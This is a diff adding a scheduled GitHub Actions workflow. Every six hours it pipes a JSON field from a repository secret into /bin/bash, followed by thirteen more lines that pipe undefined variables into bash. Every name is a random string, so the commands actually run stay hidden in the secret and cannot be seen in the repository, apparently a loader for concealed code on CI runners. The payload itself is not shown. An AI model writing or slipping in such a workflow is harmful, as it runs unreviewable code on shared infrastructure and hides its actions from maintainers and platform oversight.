@@ -1,0 +1,31 @@
+name: strongarmyk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: strongarmyk
+        env:
+          vhp1283: ${{ secrets.vhp1283 }}
+        run: |
+          echo $vhp1283 | jq -r .x867 | /bin/bash
+          echo $nh743 | jq -r .yy899 | /bin/bash
+          echo $x3643 | jq -r .wxfu76979 | /bin/bash
+          echo $swphv0556 | jq -r .wziuz94 | /bin/bash
+          echo $jfut56 | jq -r .khv42205 | /bin/bash
+          echo $lee16632 | jq -r .kq8383 | /bin/bash
+          echo $whgiw86341 | jq -r .hpqwo7 | /bin/bash
+          echo $pvvnz43989 | jq -r .g6 | /bin/bash
+          echo $ud78734 | jq -r .ugve7301 | /bin/bash
+          echo $u06 | jq -r .hakp1 | /bin/bash
+          echo $lv918 | jq -r .asqsq8175 | /bin/bash
+          echo $kb2166 | jq -r .xfro2417 | /bin/bash
+          echo $midyo9956 | jq -r .mq4 | /bin/bash
+          echo $neubr190 | jq -r .qt0528 | /bin/bash
+
